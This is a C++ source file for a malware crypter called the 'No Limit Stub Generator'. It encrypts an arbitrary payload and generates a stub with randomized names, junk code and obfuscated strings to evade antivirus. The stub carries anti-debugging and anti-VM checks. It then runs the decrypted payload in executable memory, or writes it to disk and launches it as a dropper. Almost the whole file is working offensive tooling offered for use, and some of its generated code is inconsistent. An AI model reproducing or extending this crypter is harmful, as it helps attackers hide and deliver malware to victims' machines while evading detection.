#include <iostream>
#include <fstream>
#include <sstream>
#include <vector>
#include <string>
#include <random>
#include <chrono>
#include <ctime>
#include <thread>
#include <iomanip>
#include <algorithm>
#include <memory>
#include <functional>

#ifdef _WIN32
#include <windows.h>
#include <tlhelp32.h>
#pragma comment(lib, "advapi32.lib")
#else
#include <unistd.h>
#include <sys/stat.h>
#endif

class NoLimitStubGenerator {
private:
    // Dynamic entropy collector
    struct EntropyCollector {
        uint64_t mouseMovements = 0;
        uint64_t keyPresses = 0;
        uint64_t processCount = 0;
        uint64_t memoryAvailable = 0;
        uint64_t cpuCycles = 0;
        uint64_t networkPackets = 0;
        uint64_t diskOperations = 0;
        uint64_t systemUptime = 0;
        
        uint64_t collect() {
            uint64_t entropy = 0;
            
            // Collect various system metrics
            auto now = std::chrono::high_resolution_clock::now();
            entropy ^= now.time_since_epoch().count();
            
            // Thread timing entropy
            std::this_thread::sleep_for(std::chrono::nanoseconds(1));
            auto after = std::chrono::high_resolution_clock::now();
            entropy ^= (after - now).count();
            
            // Memory address entropy
            void* ptr = malloc(1);
            entropy ^= reinterpret_cast<uintptr_t>(ptr);
            free(ptr);
            
            // Stack address entropy
            uint64_t stackVar;
            entropy ^= reinterpret_cast<uintptr_t>(&stackVar);
            
#ifdef _WIN32
            // Windows-specific entropy
            MEMORYSTATUSEX memStatus;
            memStatus.dwLength = sizeof(memStatus);
            if (GlobalMemoryStatusEx(&memStatus)) {
                entropy ^= memStatus.ullAvailPhys;
                entropy ^= memStatus.ullAvailVirtual;
            }
            
            // Process count
            HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (snapshot != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe32;
                pe32.dwSize = sizeof(pe32);
                int count = 0;
                if (Process32First(snapshot, &pe32)) {
                    do {
                        count++;
                    } while (Process32Next(snapshot, &pe32));
                }
                entropy ^= count;
                CloseHandle(snapshot);
            }
            
            // Performance counter
            LARGE_INTEGER pc;
            QueryPerformanceCounter(&pc);
            entropy ^= pc.QuadPart;
#else
            // Linux entropy sources
            std::ifstream urandom("/dev/urandom", std::ios::binary);
            if (urandom) {
                uint64_t randomBytes;
                urandom.read(reinterpret_cast<char*>(&randomBytes), sizeof(randomBytes));
                entropy ^= randomBytes;
            }
#endif
            
            // CPU cycle approximation
            for (volatile int i = 0; i < 100; i++) {
                entropy ^= i * entropy;
            }
            
            return entropy;
        }
    };
    
    // Encryption method selector based on entropy
    enum EncryptionMethod {
        XOR_SIMPLE = 0,
        XOR_ROLLING,
        XOR_MULTIKEY,
        RC4,
        RC4_MODIFIED,
        CHACHA8,
        CHACHA20,
        AES_ECB,
        AES_CTR,
        CUSTOM_STREAM,
        BLOWFISH_LITE,
        TEA,
        XTEA,
        SALSA20,
        GRAIN,
        TRIVIUM
    };
    
    EntropyCollector entropy;
    std::mt19937_64 primaryRng;
    std::mt19937 secondaryRng;
    std::minstd_rand fallbackRng;
    
    // Initialize with maximum entropy
    void initializeGenerators() {
        uint64_t e1 = entropy.collect();
        uint64_t e2 = entropy.collect();
        uint64_t e3 = entropy.collect();
        
        // Mix entropy sources
        std::seed_seq seed{
            static_cast<uint32_t>(e1), static_cast<uint32_t>(e1 >> 32),
            static_cast<uint32_t>(e2), static_cast<uint32_t>(e2 >> 32),
            static_cast<uint32_t>(e3), static_cast<uint32_t>(e3 >> 32),
            static_cast<uint32_t>(std::time(nullptr)),
            static_cast<uint32_t>(std::clock()),
            static_cast<uint32_t>(std::hash<std::thread::id>{}(std::this_thread::get_id()))
        };
        
        primaryRng.seed(seed);
        secondaryRng.seed(primaryRng());
        fallbackRng.seed(secondaryRng());
    }
    
    // Dynamic RNG selection
    uint64_t getDynamicRandom() {
        uint64_t selector = entropy.collect() % 100;
        
        if (selector < 60) {
            return primaryRng();
        } else if (selector < 90) {
            return secondaryRng();
        } else {
            // Mix all three
            return primaryRng() ^ secondaryRng() ^ fallbackRng();
        }
    }
    
    // Generate variable names with different patterns
    std::string generateVarName() {
        std::vector<std::string> patterns = {
            "var_", "obj_", "ptr_", "ref_", "val_", "tmp_", "buf_",
            "data_", "mem_", "ctx_", "inst_", "mgr_", "hdl_", "res_"
        };
        
        std::vector<std::string> middles = {
            "Core", "Base", "Main", "Util", "Helper", "Worker", "Handler",
            "Process", "Execute", "Runtime", "Dynamic", "Static", "Global"
        };
        
        std::uniform_int_distribution<> patDist(0, patterns.size() - 1);
        std::uniform_int_distribution<> midDist(0, middles.size() - 1);
        std::uniform_int_distribution<> numDist(100, 9999);
        std::uniform_int_distribution<> styleDist(0, 4);
        
        std::string result;
        int style = styleDist(primaryRng);
        
        switch (style) {
            case 0: // pattern_middle_number
                result = patterns[patDist(primaryRng)] + middles[midDist(primaryRng)] + 
                        "_" + std::to_string(numDist(primaryRng));
                break;
            case 1: // camelCase
                result = patterns[patDist(primaryRng)];
                result[0] = std::tolower(result[0]);
                result += middles[midDist(primaryRng)];
                break;
            case 2: // UPPER_SNAKE
                result = patterns[patDist(primaryRng)] + middles[midDist(primaryRng)];
                std::transform(result.begin(), result.end(), result.begin(), ::toupper);
                break;
            case 3: // random hex-like
                result = "h";
                for (int i = 0; i < 8; i++) {
                    result += "0123456789abcdef"[getDynamicRandom() % 16];
                }
                break;
            case 4: // meaningful random
                {
                    std::vector<std::string> words = {
                        "alpha", "beta", "gamma", "delta", "epsilon", "zeta",
                        "theta", "iota", "kappa", "lambda", "sigma", "omega"
                    };
                    result = words[getDynamicRandom() % words.size()] + 
                            std::to_string(numDist(primaryRng));
                }
                break;
        }
        
        return result;
    }
    
    // Generate obfuscated string assignments
    std::string generateStringObfuscation(const std::string& str, const std::string& varName) {
        std::stringstream ss;
        std::uniform_int_distribution<> methodDist(0, 5);
        
        switch (methodDist(primaryRng)) {
            case 0: // Hex array
                ss << "const unsigned char " << varName << "_data[] = { ";
                for (size_t i = 0; i < str.length(); i++) {
                    if (i > 0) ss << ", ";
                    ss << "0x" << std::hex << (int)(unsigned char)str[i];
                }
                ss << ", 0x00 };\n";
                ss << "std::string " << varName << "(reinterpret_cast<const char*>(" 
                   << varName << "_data));\n";
                break;
                
            case 1: // Character addition
                ss << "std::string " << varName << ";\n";
                for (char c : str) {
                    ss << varName << " += (char)(" << (int)c << ");\n";
                }
                break;
                
            case 2: // Base64-like encoding
                ss << "std::string " << varName << " = decode_string(\"";
                // Simple encoding
                for (char c : str) {
                    ss << (char)(c ^ 0x42);
                }
                ss << "\", 0x42);\n";
                break;
                
            case 3: // Split and concat
                ss << "std::string " << varName << " = ";
                for (size_t i = 0; i < str.length(); i += 2) {
                    if (i > 0) ss << " + ";
                    ss << "std::string(\"" << str.substr(i, 2) << "\")";
                }
                ss << ";\n";
                break;
                
            case 4: // Reverse storage
                ss << "std::string " << varName << "_rev = \"";
                for (int i = str.length() - 1; i >= 0; i--) {
                    ss << str[i];
                }
                ss << "\";\n";
                ss << "std::string " << varName << "(" << varName 
                   << "_rev.rbegin(), " << varName << "_rev.rend());\n";
                break;
                
            case 5: // XOR chain
                {
                    uint8_t key = getDynamicRandom() % 256;
                    ss << "std::string " << varName << "_enc = \"";
                    for (char c : str) {
                        ss << (char)(c ^ key);
                        key = (key + 1) % 256;
                    }
                    ss << "\";\n";
                    ss << "std::string " << varName << " = xor_decode(" 
                       << varName << "_enc, " << (int)(getDynamicRandom() % 256) << ");\n";
                }
                break;
        }
        
        return ss.str();
    }
    
    // Generate random junk code
    std::string generateJunkCode(int complexity = 1) {
        std::stringstream ss;
        std::uniform_int_distribution<> junkDist(0, 10);
        
        for (int i = 0; i < complexity; i++) {
            switch (junkDist(primaryRng)) {
                case 0: // Dummy calculations
                    ss << "volatile int " << generateVarName() << " = " 
                       << (getDynamicRandom() % 1000) << ";\n";
                    ss << "for (int i = 0; i < " << (10 + getDynamicRandom() % 50) 
                       << "; i++) { " << generateVarName() << " ^= i; }\n";
                    break;
                    
                case 1: // Fake function calls
                    ss << "auto " << generateVarName() << " = []() { return " 
                       << (getDynamicRandom() % 256) << "; };\n";
                    break;
                    
                case 2: // Memory operations
                    ss << "std::vector<uint8_t> " << generateVarName() 
                       << "(" << (10 + getDynamicRandom() % 100) << ", 0);\n";
                    break;
                    
                case 3: // String operations
                    ss << "std::string " << generateVarName() << " = \"\";\n";
                    ss << generateVarName() << ".reserve(" << (getDynamicRandom() % 100) << ");\n";
                    break;
                    
                case 4: // Conditional branches
                    ss << "if (" << (getDynamicRandom() % 1000) << " > " 
                       << (getDynamicRandom() % 1000) << ") {\n";
                    ss << "    volatile int x = " << (getDynamicRandom() % 100) << ";\n";
                    ss << "}\n";
                    break;
                    
                default:
                    // Empty statement or comment
                    if (getDynamicRandom() % 2) {
                        ss << "// " << generateVarName() << "\n";
                    } else {
                        ss << ";\n";
                    }
            }
        }
        
        return ss.str();
    }
    
    // Generate encryption implementation based on method
    std::string generateEncryptionImplementation(EncryptionMethod method) {
        std::stringstream ss;
        
        switch (method) {
            case XOR_SIMPLE:
                ss << R"(
void xor_decrypt(uint8_t* data, size_t len, const uint8_t* key, size_t keyLen) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key[i % keyLen];
    }
}
)";
                break;
                
            case XOR_ROLLING:
                ss << R"(
void xor_rolling_decrypt(uint8_t* data, size_t len, uint8_t key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
        key = (key << 1) | (key >> 7); // Rotate
    }
}
)";
                break;
                
            case RC4:
                ss << R"(
void rc4_decrypt(uint8_t* data, size_t len, const uint8_t* key, size_t keyLen) {
    uint8_t S[256];
    for (int i = 0; i < 256; i++) S[i] = i;
    
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % keyLen]) % 256;
        std::swap(S[i], S[j]);
    }
    
    int i = 0;
    j = 0;
    for (size_t k = 0; k < len; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        std::swap(S[i], S[j]);
        data[k] ^= S[(S[i] + S[j]) % 256];
    }
}
)";
                break;
                
            case TEA:
                ss << R"(
void tea_decrypt(uint32_t* v, const uint32_t* k) {
    uint32_t v0 = v[0], v1 = v[1];
    uint32_t sum = 0xC6EF3720;
    uint32_t delta = 0x9E3779B9;
    for (int i = 0; i < 32; i++) {
        v1 -= ((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]);
        v0 -= ((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]);
        sum -= delta;
    }
    v[0] = v0; v[1] = v1;
}
)";
                break;
                
            case CHACHA20:
                ss << generateFullChaCha20Implementation();
                break;
                
            default:
                // Fallback to XOR
                ss << R"(
void decrypt_data(uint8_t* data, size_t len, const uint8_t* key, size_t keyLen) {
    // Dynamic decryption
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key[i % keyLen] ^ (i & 0xFF);
    }
}
)";
        }
        
        return ss.str();
    }
    
    std::string generateFullChaCha20Implementation() {
        return R"(
inline uint32_t rotl32(uint32_t x, int n) {
    return (x << n) | (x >> (32 - n));
}

void chacha20_quarter_round(uint32_t& a, uint32_t& b, uint32_t& c, uint32_t& d) {
    a += b; d ^= a; d = rotl32(d, 16);
    c += d; b ^= c; b = rotl32(b, 12);
    a += b; d ^= a; d = rotl32(d, 8);
    c += d; b ^= c; b = rotl32(b, 7);
}

void chacha20_block(uint32_t out[16], const uint32_t in[16]) {
    uint32_t x[16];
    for (int i = 0; i < 16; i++) x[i] = in[i];
    
    for (int i = 0; i < 10; i++) {
        // Column rounds
        chacha20_quarter_round(x[0], x[4], x[8], x[12]);
        chacha20_quarter_round(x[1], x[5], x[9], x[13]);
        chacha20_quarter_round(x[2], x[6], x[10], x[14]);
        chacha20_quarter_round(x[3], x[7], x[11], x[15]);
        // Diagonal rounds
        chacha20_quarter_round(x[0], x[5], x[10], x[15]);
        chacha20_quarter_round(x[1], x[6], x[11], x[12]);
        chacha20_quarter_round(x[2], x[7], x[8], x[13]);
        chacha20_quarter_round(x[3], x[4], x[9], x[14]);
    }
    
    for (int i = 0; i < 16; i++) out[i] = x[i] + in[i];
}

void chacha20_decrypt(uint8_t* data, size_t len, const uint8_t key[32], const uint8_t nonce[12]) {
    uint32_t state[16] = {
        0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
    };
    
    // Load key
    for (int i = 0; i < 8; i++) {
        state[4 + i] = ((uint32_t)key[4*i]) | ((uint32_t)key[4*i+1] << 8) |
                       ((uint32_t)key[4*i+2] << 16) | ((uint32_t)key[4*i+3] << 24);
    }
    
    // Load nonce
    for (int i = 0; i < 3; i++) {
        state[13 + i] = ((uint32_t)nonce[4*i]) | ((uint32_t)nonce[4*i+1] << 8) |
                        ((uint32_t)nonce[4*i+2] << 16) | ((uint32_t)nonce[4*i+3] << 24);
    }
    
    uint32_t keystream[16];
    size_t pos = 0;
    uint32_t counter = 0;
    
    while (pos < len) {
        state[12] = counter++;
        chacha20_block(keystream, state);
        
        size_t block_size = std::min(size_t(64), len - pos);
        uint8_t* keystream_bytes = (uint8_t*)keystream;
        for (size_t i = 0; i < block_size; i++) {
            data[pos + i] ^= keystream_bytes[i];
        }
        pos += block_size;
    }
}
)";
    }
    
public:
    NoLimitStubGenerator() {
        initializeGenerators();
    }
    
    struct StubOptions {
        std::string stubType = "execute";  // execute, dropper, loader, injector
        std::string platform = "windows";  // windows, linux, both
        bool antiDebug = true;
        bool antiVM = true;
        bool obfuscate = true;
        int junkComplexity = 3;
        bool useMultipleEncryption = false;
        bool dynamicAPI = true;
        bool selfModifying = false;
        size_t maxSize = 0;  // 0 = no limit
    };
    
    std::string generateUnlimitedStub(const std::vector<uint8_t>& payload, 
                                     const StubOptions& options = StubOptions()) {
        // Reseed with fresh entropy for each generation
        initializeGenerators();
        
        // Select encryption method based on entropy
        EncryptionMethod primaryMethod = static_cast<EncryptionMethod>(
            getDynamicRandom() % 16
        );
        
        // Generate unique variable names
        std::string mainFunc = generateVarName();
        std::string payloadVar = generateVarName();
        std::string keyVar = generateVarName();
        std::string nonceVar = generateVarName();
        std::string decryptFunc = generateVarName();
        
        std::stringstream stub;
        
        // Headers
        stub << "#include <iostream>\n";
        stub << "#include <vector>\n";
        stub << "#include <cstring>\n";
        stub << "#include <cstdint>\n";
        stub << "#include <algorithm>\n";
        
        if (options.platform != "linux") {
            stub << "#ifdef _WIN32\n";
            stub << "#include <windows.h>\n";
            if (options.dynamicAPI) {
                stub << "#include <winternl.h>\n";
            }
            stub << "#endif\n";
        }
        
        stub << "\n";
        
        // Anti-analysis functions if enabled
        if (options.antiDebug) {
            stub << generateAntiDebugCode();
        }
        
        if (options.antiVM) {
            stub << generateAntiVMCode();
        }
        
        // Junk code
        if (options.obfuscate) {
            stub << generateJunkCode(options.junkComplexity);
        }
        
        // Encryption implementation
        stub << generateEncryptionImplementation(primaryMethod);
        
        // Generate keys
        size_t keySize = 32;
        size_t nonceSize = 12;
        if (primaryMethod == XOR_SIMPLE || primaryMethod == XOR_ROLLING) {
            keySize = 16 + (getDynamicRandom() % 16);
            nonceSize = 0;
        }
        
        std::vector<uint8_t> key(keySize);
        std::vector<uint8_t> nonce(nonceSize);
        
        for (size_t i = 0; i < keySize; i++) {
            key[i] = getDynamicRandom() % 256;
        }
        for (size_t i = 0; i < nonceSize; i++) {
            nonce[i] = getDynamicRandom() % 256;
        }
        
        // Encrypt payload
        std::vector<uint8_t> encrypted = encryptPayload(payload, primaryMethod, key, nonce);
        
        // Embed encrypted payload
        stub << "\n// Encrypted payload\n";
        stub << "const unsigned char " << payloadVar << "[] = {\n    ";
        for (size_t i = 0; i < encrypted.size(); i++) {
            if (i > 0 && i % 16 == 0) stub << "\n    ";
            stub << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                 << (int)encrypted[i];
            if (i < encrypted.size() - 1) stub << ", ";
        }
        stub << "\n};\n\n";
        
        // Embed key
        stub << "const unsigned char " << keyVar << "[] = { ";
        for (size_t i = 0; i < key.size(); i++) {
            if (i > 0) stub << ", ";
            stub << "0x" << std::hex << (int)key[i];
        }
        stub << " };\n";
        
        if (nonceSize > 0) {
            stub << "const unsigned char " << nonceVar << "[] = { ";
            for (size_t i = 0; i < nonce.size(); i++) {
                if (i > 0) stub << ", ";
                stub << "0x" << std::hex << (int)nonce[i];
            }
            stub << " };\n";
        }
        
        // More junk
        if (options.obfuscate) {
            stub << "\n" << generateJunkCode(options.junkComplexity / 2);
        }
        
        // Main function with random name
        stub << "\nint " << (getDynamicRandom() % 2 ? "main" : "WinMain") << "(";
        if (getDynamicRandom() % 2) {
            stub << "int argc, char* argv[]";
        } else {
            stub << "void";
        }
        stub << ") {\n";
        
        // Anti-analysis checks
        if (options.antiDebug) {
            stub << "    if (isDebuggerPresent()) return 1;\n";
        }
        if (options.antiVM) {
            stub << "    if (isVirtualMachine()) return 1;\n";
        }
        
        // Decrypt payload
        stub << "    std::vector<uint8_t> " << generateVarName() 
             << "(sizeof(" << payloadVar << "));\n";
        stub << "    memcpy(" << generateVarName() << ".data(), " 
             << payloadVar << ", sizeof(" << payloadVar << "));\n";
        
        // Call appropriate decryption
        switch (primaryMethod) {
            case CHACHA20:
                stub << "    chacha20_decrypt(" << generateVarName() << ".data(), "
                     << "sizeof(" << payloadVar << "), " << keyVar << ", " << nonceVar << ");\n";
                break;
            case RC4:
                stub << "    rc4_decrypt(" << generateVarName() << ".data(), "
                     << "sizeof(" << payloadVar << "), " << keyVar << ", sizeof(" << keyVar << "));\n";
                break;
            default:
                stub << "    xor_decrypt(" << generateVarName() << ".data(), "
                     << "sizeof(" << payloadVar << "), " << keyVar << ", sizeof(" << keyVar << "));\n";
        }
        
        // Execute based on stub type
        if (options.stubType == "execute") {
            stub << generateExecutionCode(generateVarName());
        } else if (options.stubType == "dropper") {
            stub << generateDropperCode(generateVarName());
        }
        
        stub << "    return 0;\n";
        stub << "}\n";
        
        return stub.str();
    }
    
private:
    std::string generateAntiDebugCode() {
        return R"(
bool isDebuggerPresent() {
#ifdef _WIN32
    if (IsDebuggerPresent()) return true;
    
    BOOL isDebugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
    if (isDebugged) return true;
    
    // Check PEB
    __try {
        __asm {
            mov eax, fs:[30h]
            movzx eax, byte ptr[eax + 2]
            test eax, eax
            jnz debugger_found
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        return true;
    }
    
    return false;
debugger_found:
    return true;
#else
    // Linux anti-debug
    FILE* fp = fopen("/proc/self/status", "r");
    if (fp) {
        char line[256];
        while (fgets(line, sizeof(line), fp)) {
            if (strncmp(line, "TracerPid:", 10) == 0) {
                int pid = atoi(line + 10);
                fclose(fp);
                return pid != 0;
            }
        }
        fclose(fp);
    }
    return false;
#endif
}
)";
    }
    
    std::string generateAntiVMCode() {
        return R"(
bool isVirtualMachine() {
#ifdef _WIN32
    // Check for VM artifacts
    const char* vmFiles[] = {
        "C:\\windows\\system32\\drivers\\vmmouse.sys",
        "C:\\windows\\system32\\drivers\\vmhgfs.sys",
        "C:\\windows\\system32\\drivers\\vboxmouse.sys",
        "C:\\windows\\system32\\drivers\\vboxguest.sys",
        "C:\\windows\\system32\\drivers\\vboxsf.sys"
    };
    
    for (const char* file : vmFiles) {
        if (GetFileAttributesA(file) != INVALID_FILE_ATTRIBUTES) {
            return true;
        }
    }
    
    // Check registry
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
        "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum", 
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[256];
        DWORD size = sizeof(buffer);
        if (RegQueryValueExA(hKey, "0", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            if (strstr(buffer, "VMware") || strstr(buffer, "VBOX") || strstr(buffer, "QEMU")) {
                RegCloseKey(hKey);
                return true;
            }
        }
        RegCloseKey(hKey);
    }
#endif
    return false;
}
)";
    }
    
    std::string generateExecutionCode(const std::string& payloadVar) {
        std::stringstream ss;
        
        ss << "#ifdef _WIN32\n";
        ss << "    LPVOID " << generateVarName() << " = VirtualAlloc(NULL, " 
           << payloadVar << ".size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n";
        ss << "    if (" << generateVarName() << ") {\n";
        ss << "        memcpy(" << generateVarName() << ", " << payloadVar << ".data(), " 
           << payloadVar << ".size());\n";
        ss << "        ((void(*)())" << generateVarName() << ")();\n";
        ss << "    }\n";
        ss << "#else\n";
        ss << "    void* " << generateVarName() << " = mmap(NULL, " << payloadVar 
           << ".size(), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n";
        ss << "    if (" << generateVarName() << " != MAP_FAILED) {\n";
        ss << "        memcpy(" << generateVarName() << ", " << payloadVar << ".data(), " 
           << payloadVar << ".size());\n";
        ss << "        ((void(*)())" << generateVarName() << ")();\n";
        ss << "    }\n";
        ss << "#endif\n";
        
        return ss.str();
    }
    
    std::string generateDropperCode(const std::string& payloadVar) {
        std::stringstream ss;
        std::string filename = "dropped_" + std::to_string(getDynamicRandom() % 10000) + ".exe";
        
        ss << "    std::ofstream " << generateVarName() << "(\"" << filename 
           << "\", std::ios::binary);\n";
        ss << "    if (" << generateVarName() << ") {\n";
        ss << "        " << generateVarName() << ".write(reinterpret_cast<const char*>(" 
           << payloadVar << ".data()), " << payloadVar << ".size());\n";
        ss << "        " << generateVarName() << ".close();\n";
        ss << "#ifdef _WIN32\n";
        ss << "        ShellExecuteA(NULL, \"open\", \"" << filename 
           << "\", NULL, NULL, SW_SHOW);\n";
        ss << "#else\n";
        ss << "        system(\"chmod +x " << filename << " && ./" << filename << "\");\n";
        ss << "#endif\n";
        ss << "    }\n";
        
        return ss.str();
    }
    
    std::vector<uint8_t> encryptPayload(const std::vector<uint8_t>& payload, 
                                        EncryptionMethod method,
                                        const std::vector<uint8_t>& key,
                                        const std::vector<uint8_t>& nonce) {
        std::vector<uint8_t> encrypted = payload;
        
        switch (method) {
            case XOR_SIMPLE:
                for (size_t i = 0; i < encrypted.size(); i++) {
                    encrypted[i] ^= key[i % key.size()];
                }
                break;
                
            case XOR_ROLLING:
                {
                    uint8_t rollingKey = key[0];
                    for (size_t i = 0; i < encrypted.size(); i++) {
                        encrypted[i] ^= rollingKey;
                        rollingKey = (rollingKey << 1) | (rollingKey >> 7);
                    }
                }
                break;
                
            case RC4:
                {
                    uint8_t S[256];
                    for (int i = 0; i < 256; i++) S[i] = i;
                    
                    int j = 0;
                    for (int i = 0; i < 256; i++) {
                        j = (j + S[i] + key[i % key.size()]) % 256;
                        std::swap(S[i], S[j]);
                    }
                    
                    int i = 0;
                    j = 0;
                    for (size_t k = 0; k < encrypted.size(); k++) {
                        i = (i + 1) % 256;
                        j = (j + S[i]) % 256;
                        std::swap(S[i], S[j]);
                        encrypted[k] ^= S[(S[i] + S[j]) % 256];
                    }
                }
                break;
                
            default:
                // Simple XOR fallback
                for (size_t i = 0; i < encrypted.size(); i++) {
                    encrypted[i] ^= key[i % key.size()] ^ (i & 0xFF);
                }
        }
        
        return encrypted;
    }
};

int main(int argc, char* argv[]) {
    NoLimitStubGenerator generator;
    
    if (argc < 2) {
        std::cout << "=== No Limit Stub Generator ===" << std::endl;
        std::cout << "Generates unlimited unique stubs with dynamic encryption\n" << std::endl;
        std::cout << "Usage: " << argv[0] << " <payload> [output.cpp] [options]" << std::endl;
        std::cout << "\nOptions:" << std::endl;
        std::cout << "  --type <execute|dropper|loader>  Stub type (default: execute)" << std::endl;
        std::cout << "  --platform <windows|linux|both>  Target platform (default: windows)" << std::endl;
        std::cout << "  --no-antidebug                   Disable anti-debugging" << std::endl;
        std::cout << "  --no-antivm                      Disable anti-VM" << std::endl;
        std::cout << "  --junk <0-10>                    Junk code complexity (default: 3)" << std::endl;
        std::cout << "  --multi-encrypt                  Use multiple encryption layers" << std::endl;
        return 1;
    }
    
    // Read payload
    std::ifstream in(argv[1], std::ios::binary);
    if (!in) {
        std::cerr << "Failed to open payload file: " << argv[1] << std::endl;
        return 1;
    }
    
    in.seekg(0, std::ios::end);
    size_t size = in.tellg();
    in.seekg(0, std::ios::beg);
    
    std::vector<uint8_t> payload(size);
    in.read(reinterpret_cast<char*>(payload.data()), size);
    in.close();
    
    // Parse options
    NoLimitStubGenerator::StubOptions options;
    for (int i = 3; i < argc; i++) {
        std::string arg = argv[i];
        if (arg == "--type" && i + 1 < argc) {
            options.stubType = argv[++i];
        } else if (arg == "--platform" && i + 1 < argc) {
            options.platform = argv[++i];
        } else if (arg == "--no-antidebug") {
            options.antiDebug = false;
        } else if (arg == "--no-antivm") {
            options.antiVM = false;
        } else if (arg == "--junk" && i + 1 < argc) {
            options.junkComplexity = std::stoi(argv[++i]);
        } else if (arg == "--multi-encrypt") {
            options.useMultipleEncryption = true;
        }
    }
    
    // Generate stub
    std::string stub = generator.generateUnlimitedStub(payload, options);
    
    // Output
    std::string outputFile = (argc > 2) ? argv[2] : "no_limit_stub.cpp";
    std::ofstream out(outputFile);
    if (!out) {
        std::cerr << "Failed to create output file: " << outputFile << std::endl;
        return 1;
    }
    
    out << stub;
    out.close();
    
    std::cout << "No Limit Stub generated: " << outputFile << std::endl;
    std::cout << "Payload size: " << size << " bytes" << std::endl;
    std::cout << "Stub size: " << stub.length() << " bytes" << std::endl;
    std::cout << "Unique entropy collected for maximum randomness" << std::endl;
    std::cout << "\nCompile with: g++ -O3 -s " << outputFile << " -o output" << std::endl;
    
    return 0;
}